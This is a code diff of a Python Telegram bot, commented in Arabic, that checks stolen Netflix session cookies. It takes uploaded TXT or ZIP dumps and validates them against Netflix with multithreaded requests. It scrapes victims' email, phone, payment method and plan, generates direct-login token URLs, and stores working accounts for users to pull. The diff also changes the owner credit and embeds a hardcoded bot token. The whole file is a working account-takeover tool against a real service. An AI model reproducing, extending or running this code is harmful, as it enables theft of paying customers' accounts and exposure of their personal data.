@@ -11,92 +11,66 @@ import tempfile
 import shutil
 from datetime import datetime
 import uuid
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import random
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Owner credit & Channel info
-OWNER_CREDIT = "Faris - https://t.me/@farxxes"
-CHANNEL_LINK = "https://t.me/faresschannel"
+# Owner credit
+OWNER_CREDIT = "Huy Vũ - https://huyvu2512.io.vn"
 
 # إعدادات بوت التليجرام
-BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAHQh9fufbVd63QoICaFK8rwdRzHD9V91SI')
+BOT_TOKEN = os.environ.get('BOT_TOKEN', '8890151932:AAGHgPOiXAKwA_Z2b6ZAHPbHFrHSmYKJKxM')
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# 👑 إعدادات المطور الخاصة بك (fares) - نقاط بلا حدود
-DEVELOPER_ID = 8713916851
+# إعدادات الاشتراك الإجباري (ضع معرف قناتك هنا أو اتركها فارغة إذا لمغن أردت إلغاءها)
+REQUIRED_CHANNEL = os.environ.get('REQUIRED_CHANNEL', '@YourChannelUsername') # مثال: '@MyChannel' أو معرف رقمي '-100xxxxxxxxxx'
+CHANNEL_LINK = os.environ.get('CHANNEL_LINK', 'https://t.me/YourChannelUsername')
 
-STOCK_FILE = "stock_accounts.txt"
-USERS_FILE = "users_data.json"
+# ملف الذاكرة لحفظ الحسابات والإحصائيات
+DB_FILE = 'database.json'
+db_lock = threading.Lock()
 
-# قاموس لتتبع عمليات الفحص الجارية وإمكانية إيقافها
-active_scans = {}
-
-def load_users():
-    if not os.path.exists(USERS_FILE):
-        return {}
+def load_db():
+    if not os.path.exists(DB_FILE):
+        return {"users": [], "accounts": [], "stats": {"checked": 0, "valid": 0}}
     try:
-        with open(USERS_FILE, "r", encoding="utf-8") as f:
+        with open(DB_FILE, 'r', encoding='utf-8') as f:
             return json.load(f)
     except:
-        return {}
+        return {"users": [], "accounts": [], "stats": {"checked": 0, "valid": 0}}
 
-def save_users(users_data):
+def save_db(data):
+    with db_lock:
+        with open(DB_FILE, 'w', encoding='utf-8') as f:
+            json.dump(data, f, ensure_ascii=False, indent=4)
+
+def add_account_to_db(account_info):
+    db = load_db()
+    netflix_id = account_info['cookie'].get('NetflixId')
+    # التحقق من عدم تكرار الحساب بناءً على البريد أو NetflixId
+    exists = any(acc['cookie'].get('NetflixId') == netflix_id or (acc.get('email') != 'Unknown' and acc.get('email') == account_info.get('email')) for acc in db['accounts'])
+    if not exists:
+        db['accounts'].append(account_info)
+        db['stats']['valid'] = len(db['accounts'])
+        save_db(db)
+        return True
+    return False
+
+def check_subscription(user_id):
+    if not REQUIRED_CHANNEL:
+        return True
     try:
-        with open(USERS_FILE, "w", encoding="utf-8") as f:
-            json.dump(users_data, f, indent=4)
+        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
+        if member.status in ['member', 'creator', 'administrator']:
+            return True
     except Exception as e:
-        logger.error(f"Error saving users: {e}")
-
-def add_user_if_not_exists(user_id):
-    users = load_users()
-    str_id = str(user_id)
-    if str_id not in users:
-        # المطور يحصل تلقائياً على نقاط مالا نهاية (999999) والمستخدمين العاديين 3 نقاط
-        initial_points = 999999 if int(user_id) == DEVELOPER_ID else 3
-        users[str_id] = {"points": initial_points, "joined_date": datetime.now().strftime('%Y-%m-%d')}
-        save_users(users)
-    else:
-        # تأكيد دائم بأن نقاط المطور لا تنتهي أبداً
-        if int(user_id) == DEVELOPER_ID:
-            users[str_id]["points"] = 999999
-            save_users(users)
-
-def save_to_stock(account_text):
-    try:
-        with open(STOCK_FILE, "a", encoding="utf-8") as f:
-            f.write(account_text + "\n" + "="*40 + "\n")
-    except Exception as e:
-        logger.error(f"Error saving to stock: {e}")
-
-def get_random_account_from_stock():
-    if not os.path.exists(STOCK_FILE):
-        return None
-    try:
-        with open(STOCK_FILE, "r", encoding="utf-8") as f:
-            content = f.read().strip()
-        if not content:
-            return None
-        
-        accounts = content.split("="*40)
-        accounts = [acc.strip() for acc in accounts if acc.strip()]
-        
-        if not accounts:
-            return None
-            
-        chosen_acc = random.choice(accounts)
-        remaining_accounts = [acc for acc in accounts if acc != chosen_acc]
-        with open(STOCK_FILE, "w", encoding="utf-8") as f:
-            f.write(("\n" + "="*40 + "\n").join(remaining_accounts) + ("\n" + "="*40 + "\n" if remaining_accounts else ""))
-            
-        return chosen_acc
-    except Exception as e:
-        logger.error(f"Error getting account from stock: {e}")
-        return None
+        logger.error(f"Error checking subscription: {e}")
+    return False
 
 def unescape_plan(s):
     try:
@@ -105,7 +79,6 @@ def unescape_plan(s):
         return s
 
 def format_billing_date(raw):
-    """Convert ISO 8601 billing date to dd/MM/yyyy"""
     try:
         raw = raw.replace('\\x2B', '+').replace('%2B', '+').replace('\\x2b', '+')
         clean = re.sub(r'[+-]\d{2}:?\d{2}$', '', raw.split('.')[0])
@@ -169,7 +142,6 @@ def extract_netflix_id(content):
     return None
 
 def extract_next_billing_date(response_text):
-    """Extract next billing date from GraphQL response"""
     try:
         billing_match = re.search(r'"nextBillingDate":\s*\{[^}]+\}', response_text)
         if billing_match:
@@ -193,7 +165,6 @@ def check_netflix_cookie(cookie_dict):
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.9',
-        'Accept-Encoding': 'gzip, deflate, br',
         'Connection': 'keep-alive',
         'Upgrade-Insecure-Requests': '1'
     }
@@ -222,6 +193,7 @@ def check_netflix_cookie(cookie_dict):
         member_since = unescape_plan(member_since) if member_since else "Unknown"
 
         payment_method = find(r'"paymentMethod"[^}]+"value":"([^"]+)"') or "Unknown"
+
         phone = find(r'"phoneNumberDigits"[^}]+"value":"([^"]+)"')
         phone = phone.replace("\\x2B", "+") if phone else "Unknown"
 
@@ -238,6 +210,7 @@ def check_netflix_cookie(cookie_dict):
         extra_member = "Yes" if extra_member_match and extra_member_match.group(1) == 'true' else "No"
 
         email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
+        
         country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
         
         email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
@@ -252,8 +225,9 @@ def check_netflix_cookie(cookie_dict):
             for profile in profile_matches:
                 if profile and profile not in profiles:
                     profiles.append(profile)
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"Error extracting profiles: {e}")
+        
         profiles_str = ", ".join(profiles) if profiles else "Unknown"
 
         status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
@@ -285,6 +259,7 @@ def check_netflix_cookie(cookie_dict):
             'cookie': cookie_dict
         }
     except Exception as e:
+        logger.error(f"Error checking Netflix cookie: {str(e)}")
         return {'ok': False, 'err': str(e), 'cookie': cookie_dict}
 
 def generate_token(netflix_id):
@@ -382,139 +357,121 @@ def extract_zip_and_get_files(zip_path, extract_dir):
         logger.error(f"Error extracting ZIP file: {e}")
         return []
 
-# واجهة الأزرار عند البداية
-@bot.message_handler(commands=['start'])
+def process_single_line(line):
+    netflix_id = extract_netflix_id(line)
+    if not netflix_id:
+        return None
+    account_info = check_netflix_cookie({"NetflixId": netflix_id})
+    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
+        token_result = generate_token(netflix_id)
+        account_info['token_result'] = token_result
+        # حفظ الحساب في الذاكرة المحلية
+        add_account_to_db(account_info)
+        return account_info
+    return None
+
+# دالة للتحقق من الاشتراك الإجباري قبل تنفيذ أي أمر
+def send_sub_required_message(message):
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("📢 اشترك في القناة هنا", url=CHANNEL_LINK))
+    markup.add(InlineKeyboardButton("🔄 تحقق من الاشتراك", callback_data="check_sub"))
+    bot.reply_to(message, "⚠️ **عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!**\n\nبعد الاشتراك، اضغط على زر التحقق أدناه.", reply_markup=markup, parse_mode='Markdown')
+
+@bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
     user_id = message.from_user.id
-    add_user_if_not_exists(user_id)
-    
-    markup = InlineKeyboardMarkup()
-    markup.row_width = 1
-    markup.add(
-        InlineKeyboardButton("📂 فحص ملفات (TXT / ZIP)", callback_data="btn_check"),
-        InlineKeyboardButton("🎁 سحب حساب من الذاكرة (نقاط بلا حدود)", callback_data="btn_stock"),
-        InlineKeyboardButton("💰 رصيدي النقدي", callback_data="btn_balance"),
-        InlineKeyboardButton("📢 قناة البوت", url=CHANNEL_LINK)
+    if not check_subscription(user_id):
+        send_sub_required_message(message)
+        return
+        
+    db = load_db()
+    if user_id not in db["users"]:
+        db["users"].append(user_id)
+        save_db(db)
+
+    welcome_text = (
+        "🎬 **أهلاً بك في بوت فحص كوكيز Netflix الشامل والمطور!**\n\n"
+        "🔹 أرسل لي نص الكوكي، أو ارفع ملف `.txt` أو ملف مضغوط `.zip` وسأقوم بفحصه بسرعة فائقة.\n"
+        "🔹 يتم حفظ الحسابات الصالحة تلقائياً في ذاكرة البوت.\n\n"
+        "📋 **الأوامر المتاحة:**\n"
+        "▪️ `/pull` أو `/getaccount` - لسحب حساب شغال من الذاكرة.\n"
+        "▪️ `/stats` - لعرض إحصائيات البوت والحسابات المخزنة.\n"
     )
-    
-    if user_id == DEVELOPER_ID:
-        markup.add(InlineKeyboardButton("⚙️ لوحة تحكم المطور (فارس)", callback_data="btn_admin"))
-        
-    welcome_text = "🎬 **مرحباً بك في بوت فحص نتفليكس الإحترافي**\n👑 *المطور:* [fares](https://t.me/farxxes)\n\nاختر أحد الخيارات أدناه للبدء:"
-    bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=markup)
+    bot.reply_to(message, welcome_text, parse_mode='Markdown')
 
-@bot.callback_query_handler(func=lambda call: True)
-def callback_query(call):
-    user_id = call.from_user.id
-    users = load_users()
-    str_id = str(user_id)
-    
-    if call.data == "btn_check":
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, "📂 **أرسل الآن ملف الكوكيز بصيغة `.txt` أو `.zip` وسأبدأ الفحص الفوري مع شاشة التقدم!**", parse_mode='Markdown')
-        
-    elif call.data == "btn_balance":
-        points = "♾️ (رصيد غير محدود للمطور)" if user_id == DEVELOPER_ID else users.get(str_id, {}).get("points", 0)
-        bot.answer_callback_query(call.id, text=f"رصيدك الحالي هو: {points}", show_alert=True)
-        
-    elif call.data == "btn_stock":
-        bot.answer_callback_query(call.id)
-        
-        # إذا لم يكن مطوراً، نتحقق من نقاطه ونخصم نقطة
-        if user_id != DEVELOPER_ID:
-            current_points = users.get(str_id, {}).get("points", 0)
-            if current_points < 1:
-                bot.send_message(call.message.chat.id, "❌ رصيدك غير كافٍ! تحتاج إلى نقطة واحدة (1) لسحب حساب من الذاكرة.")
-                return
-            users[str_id]["points"] -= 1
-            save_users(users)
-        
-        account = get_random_account_from_stock()
-        if account:
-            markup = InlineKeyboardMarkup()
-            token_match = re.search(r'nftoken=([^\s]+)', account)
-            if token_match:
-                t_val = token_match.group(1)
-                direct_url = f"https://netflix.com/unsupported?nftoken={t_val}"
-                markup.add(
-                    InlineKeyboardButton("💻 PC Login", url=direct_url),
-                    InlineKeyboardButton("📱 Phone Login", url=direct_url)
-                )
-            
-            watermarked_acc = f"{account}\n\n👑 *Dev:* @farxxes | [Channel](https://t.me/faresschannel)"
-            remaining_display = "♾️ (لا ينتهي)" if user_id == DEVELOPER_ID else users[str_id]['points']
-            bot.send_message(call.message.chat.id, f"🌟 **PREMIUM ACCOUNT** 🌟\n\n{watermarked_acc}\n\n💰 رصيدك المتبقي: {remaining_display}", parse_mode='Markdown', reply_markup=markup if token_match else None)
-        else:
-            bot.send_message(call.message.chat.id, "⚠️ عذراً، ذاكرة الحسابات فارغة حالياً. انتظر حتى يتم فحص ملفات جديدة!")
-            
-    elif call.data == "btn_admin":
-        if user_id != DEVELOPER_ID:
-            bot.answer_callback_query(call.id, text="هذا الخيار خاص بالمطور فارس فقط!", show_alert=True)
-            return
-            
-        bot.answer_callback_query(call.id)
-        total_users = len(users)
-        stock_count = 0
-        if os.path.exists(STOCK_FILE):
-            with open(STOCK_FILE, "r", encoding="utf-8") as f:
-                stock_count = f.read().count("="*40)
-                
-        admin_text = (
-            "⚙️ **لوحة تحكم المطور (فارس)**\n\n"
-            f"👥 إجمالي المستخدمين: `{total_users}`\n"
-            f"📦 الحسابات المتاحة في الذاكرة: `{stock_count}` حساب\n"
-            f"👑 رصيدك كـ مطور: `نقاط بلا حدود (♾️)`\n\n"
-            "▫️ لإضافة نقاط لمستخدم، أرسل الأمر بالشكل التالي:\n"
-            "`/addpoints [ID] [العدد]`"
-        )
-        bot.send_message(call.message.chat.id, admin_text, parse_mode='Markdown')
-        
-    elif call.data.startswith("stop_scan_"):
-        scan_id = call.data.replace("stop_scan_", "")
-        if scan_id in active_scans:
-            active_scans[scan_id] = True
-            bot.answer_callback_query(call.id, text="⏹️ تم طلب إيقاف الفحص بنجاح!", show_alert=True)
+@bot.message_handler(commands=['stats'])
+def bot_stats(message):
+    user_id = message.from_user.id
+    if not check_subscription(user_id):
+        send_sub_required_message(message)
+        return
 
-@bot.message_handler(commands=['addpoints'])
-def add_points_command(message):
-    if message.from_user.id != DEVELOPER_ID:
+    db = load_db()
+    total_users = len(db.get("users", []))
+    total_valid = len(db.get("accounts", []))
+    total_checked = db.get("stats", {}).get("checked", 0)
+
+    stats_msg = (
+        "📊 **إحصائيات بوت Netflix:**\n\n"
+        f"👥 عدد المستخدمين: `{total_users}`\n"
+        f"🔍 إجمالي الحسابات المفحوصة: `{total_checked}`\n"
+        f"💾 الحسابات الشغالة المخزنة في الذاكرة: `{total_valid}`\n"
+    )
+    bot.reply_to(message, stats_msg, parse_mode='Markdown')
+
+@bot.message_handler(commands=['pull', 'getaccount'])
+def pull_account(message):
+    user_id = message.from_user.id
+    if not check_subscription(user_id):
+        send_sub_required_message(message)
         return
-        
-    parts = message.text.split()
-    if len(parts) != 3:
-        bot.reply_to(message, "❌ الاستخدام الخاطئ للأمر. استخدم:\n`/addpoints [ID] [العدد]`", parse_mode='Markdown')
+
+    db = load_db()
+    accounts = db.get("accounts", [])
+    
+    if not accounts:
+        bot.reply_to(message, "❌ عذراً، الذاكرة فارغة حالياً ولا توجد حسابات شغالة مخزنة. قم بفحص بعض الملفات أولاً!")
         return
-        
-    target_id = parts[1]
-    try:
-        amount = int(parts[2])
-    except:
-        bot.reply_to(message, "❌ عدد النقاط يجب أن يكون رقماً صحيحاً.")
-        return
-        
-    users = load_users()
-    if target_id in users:
-        users[target_id]["points"] += amount
-        save_users(users)
-        bot.reply_to(message, f"✅ تمت إضافة {amount} نقطة بنجاح للمستخدم `{target_id}`.\n💰 رصيده الحالي: {users[target_id]['points']} نقطة", parse_mode='Markdown')
+
+    # سحب أول حساب من الذاكرة وحذفه منها حتى لا يتم إعطاؤه لشخص آخر
+    acc = accounts.pop(0)
+    db["accounts"] = accounts
+    save_db(db)
+
+    res_msg = "🎬 **حساب NETFLIX مسحوب من الذاكرة بنجاح** 🎬\n\n"
+    res_msg += f"🌍 البلد: `{acc['country']}`\n"
+    res_msg += f"📦 الباقة: `{acc['plan']}`\n"
+    res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
+    res_msg += f"📅 التجديد: `{acc['next_billing']}`\n"
+    res_msg += f"👥 الملفات: `{acc['profiles']}`\n"
+    res_msg += f"📧 البريد: `{acc['email'].replace(chr(92) + 'x40', '@')}`\n"
+    
+    token_result = acc.get('token_result', {})
+    if token_result.get('status') == 'Success':
+        mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
+        res_msg += f"\n📱 **رابط الدخول المباشر:**\n`{mobile_url}`"
+    
+    bot.reply_to(message, res_msg, parse_mode='Markdown')
+
+@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
+def callback_check_sub(call):
+    if check_subscription(call.from_user.id):
+        bot.answer_callback_query(call.id, "✅ تم التحقق من اشتراكك بنجاح! يمكنك استخدام البوت الآن.")
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        send_welcome(call.message)
     else:
-        bot.reply_to(message, "❌ هذا المستخدم غير مسجل في قاعدة بيانات البوت بعد.")
+        bot.answer_callback_query(call.id, "❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)
 
 @bot.message_handler(content_types=['document'])
 def handle_documents(message):
     user_id = message.from_user.id
-    add_user_if_not_exists(user_id)
-    
+    if not check_subscription(user_id):
+        send_sub_required_message(message)
+        return
+
     temp_dirs = []
-    scan_id = str(uuid.uuid4())
-    active_scans[scan_id] = False
-    
     try:
-        stop_markup = InlineKeyboardMarkup()
-        stop_markup.add(InlineKeyboardButton("⏹️ إيقاف الفحص", callback_data=f"stop_scan_{scan_id}"))
-        
-        status_msg = bot.send_message(message.chat.id, "⏳ **جاري تحضير الملف وبدء الفحص الإحترافي...**\n📊 التقدم: `0%`", parse_mode='Markdown', reply_markup=stop_markup)
-        
+        msg_wait = bot.reply_to(message, "⏳ جاري تحميل الملف وبدء الفحص السريع متعدد الخيوط...")
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
@@ -533,7 +490,7 @@ def handle_documents(message):
             txt_files_to_check = [file_path]
             
         if not txt_files_to_check:
-            bot.edit_message_text("❌ لم يتم العثور على ملفات نصية صالحة.", message.chat.id, status_msg.message_id)
+            bot.edit_message_text("❌ لم يتم العثور على ملفات نصية صالحة.", message.chat.id, msg_wait.message_id)
             return
             
         all_lines = []
@@ -543,101 +500,107 @@ def handle_documents(message):
                     all_lines.extend(f.readlines())
             except:
                 pass
-                
-        total_lines = len(all_lines)
-        if total_lines == 0:
-            bot.edit_message_text("❌ الملف فارغ تماماً.", message.chat.id, status_msg.message_id)
-            return
+
+        # تحديث عداد المفحوصات الكلي في الذاكرة
+        db = load_db()
+        db["stats"]["checked"] = db.get("stats", {}).get("checked", 0) + len(all_lines)
+        save_db(db)
 
         valid_count = 0
-        processed_count = 0
-        result_file_path = os.path.join(unique_dir, "the_premuim_account.txt")
-        
-        with open(result_file_path, "w", encoding="utf-8") as res_file:
-            for line in all_lines:
-                if active_scans.get(scan_id, False):
-                    bot.edit_message_text("⏹️ **تم إيقاف عملية الفحص بنجاح بناءً على طلبك.**", message.chat.id, status_msg.message_id)
-                    break
-                    
-                processed_count += 1
-                line = line.strip()
-                if not line:
-                    continue
-                    
-                if processed_count % 5 == 0 or processed_count == total_lines:
-                    percent = int((processed_count / total_lines) * 100)
-                    try:
-                        bot.edit_message_text(
-                            f"🔍 **جاري فحص الحسابات الآن...**\n📊 النسبة المئوية: `{percent}%` ({processed_count}/{total_lines})\n✅ الحسابات الفعالة: `{valid_count}`",
-                            message.chat.id, status_msg.message_id, parse_mode='Markdown', reply_markup=stop_markup
-                        )
-                    except:
-                        pass
-                        
-                netflix_id = extract_netflix_id(line)
-                if not netflix_id:
-                    continue
-                    
-                account_info = check_netflix_cookie({"NetflixId": netflix_id})
-                
-                if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
+        valid_accounts_text = ""
+
+        # استخدام ThreadPoolExecutor للفحص السريع
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = [executor.submit(process_single_line, line.strip()) for line in all_lines if line.strip()]
+            for future in as_completed(futures):
+                acc = future.result()
+                if acc:
                     valid_count += 1
-                    token_result = generate_token(netflix_id)
-                    
                     res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
-                    res_msg += f"🌍 البلد: `{account_info['country']}`\n"
-                    res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
-                    res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
-                    res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
-                    res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
-                    res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
+                    res_msg += f"🌍 البلد: `{acc['country']}`\n"
+                    res_msg += f"📦 الباقة: `{acc['plan']}`\n"
+                    res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
+                    res_msg += f"📅 التجديد: `{acc['next_billing']}`\n"
+                    res_msg += f"👥 الملفات: `{acc['profiles']}`\n"
+                    res_msg += f"📧 البريد: `{acc['email'].replace(chr(92) + 'x40', '@')}`\n"
                     
-                    markup = InlineKeyboardMarkup()
+                    token_result = acc.get('token_result', {})
                     if token_result.get('status') == 'Success':
                         mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
-                        res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`\n"
-                        markup.add(
-                            InlineKeyboardButton("💻 PC Login", url=mobile_url),
-                            InlineKeyboardButton("📱 Phone Login", url=mobile_url)
-                        )
-                    else:
-                        fallback_url = f"https://netflix.com/unsupported?nftoken={netflix_id}"
-                        res_msg += f"\n📱 رابط الدخول المباشر:\n`{fallback_url}`\n"
-                        markup.add(
-                            InlineKeyboardButton("💻 PC Login", url=fallback_url),
-                            InlineKeyboardButton("📱 Phone Login", url=fallback_url)
-                        )
+                        res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
                         
-                    res_msg += f"\n👑 *Dev:* @farxxes | [Channel](https://t.me/farxxes)"
+                    bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
                     
-                    bot.send_message(message.chat.id, res_msg, parse_mode='Markdown', reply_markup=markup)
-                    
-                    res_file.write(res_msg.replace('`', '').replace('*', '') + "\n" + "="*40 + "\n")
-                    save_to_stock(res_msg.replace('`', '').replace('*', ''))
-                    time.sleep(0.5)
-                    
-        try:
-            bot.delete_message(message.chat.id, status_msg.message_id)
-        except:
-            pass
-            
-        if valid_count > 0 and os.path.exists(result_file_path):
-            with open(result_file_path, "rb") as rf:
-                bot.send_document(message.chat.id, rf, caption=f"📁 **ملف النتائج الشامل:** `the_premuim_account.txt`\n👑 *By Fares* (@farxxes)", parse_mode='Markdown')
-                
-        bot.send_message(message.chat.id, f"✅ **انتهى الفحص بنجاح!**\n📊 إجمالي الحسابات الفعالة المكتشفة: `{valid_count}` حساب.\n👑 *Channel:* {CHANNEL_LINK}", parse_mode='Markdown')
-        
+                    # تجميع الحسابات لملف نصي نهائي إذا كان العدد كبيرًا
+                    valid_accounts_text += f"Email: {acc['email']} | Plan: {acc['plan']} | Expiry: {acc['next_billing']}\n"
+
+        bot.edit_message_text(f"✅ انتهى الفحص. تم العثور على وحفظ ({valid_count}) حساب شغال وفعال في الذاكرة.", message.chat.id, msg_wait.message_id)
+
+        # إذا كانت النظات كثيرة، يمكن إرسال ملف نصي يضم الحسابات
+        if valid_count > 0 and valid_accounts_text:
+            result_file_path = os.path.join(unique_dir, "valid_accounts.txt")
+            with open(result_file_path, 'w', encoding='utf-8') as rf:
+                rf.write(valid_accounts_text)
+            with open(result_file_path, 'rb') as rf:
+                bot.send_document(message.chat.id, rf, caption="📁 ملف يضم ملخص الحسابات الصالحة التي تم استخراجها.")
+
     except Exception as e:
-        bot.reply_to(message, f"❌ حدث خطأ أثناء المعالجة: {str(e)}")
+        bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")
     finally:
-        if scan_id in active_scans:
-            del active_scans[scan_id]
         for temp_dir in temp_dirs:
             try:
                 shutil.rmtree(temp_dir)
             except:
                 pass
 
+@bot.message_handler(func=lambda message: True)
+def handle_text_message(message):
+    user_id = message.from_user.id
+    if not check_subscription(user_id):
+        send_sub_required_message(message)
+        return
+
+    content = message.text
+    if not content or content.startswith('/'):
+        return
+        
+    msg_wait = bot.reply_to(message, "⏳ جاري فحص الكوكي والتحقق من حالته...")
+    netflix_id = extract_netflix_id(content)
+    
+    if not netflix_id:
+        bot.edit_message_text("❌ لم يتم العثور على `NetflixId` صالح في النص.", message.chat.id, msg_wait.message_id)
+        return
+        
+    # تحديث إحصائيات المفحوصات
+    db = load_db()
+    db["stats"]["checked"] = db.get("stats", {}).get("checked", 0) + 1
+    save_db(db)
+
+    account_info = check_netflix_cookie({"NetflixId": netflix_id})
+    
+    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
+        token_result = generate_token(netflix_id)
+        account_info['token_result'] = token_result
+        
+        # حفظ الحساب في الذاكرة تلقائياً
+        add_account_to_db(account_info)
+        
+        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
+        res_msg += f"🌍 البلد: `{account_info['country']}`\n"
+        res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
+        res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
+        res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
+        res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
+        res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
+        
+        if token_result.get('status') == 'Success':
+            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
+            res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
+            
+        bot.edit_message_text(res_msg, message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+    else:
+        bot.edit_message_text("❌ هذا الحساب غير شغال أو معلوماته غير متوفرة (منتهي أو وهمي).", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+
 if __name__ == '__main__':
-    logger.info("Telegram Bot is running for Faris with unlimited developer points...")
+    logger.info("Telegram Bot is running...")
     bot.infinity_polling()
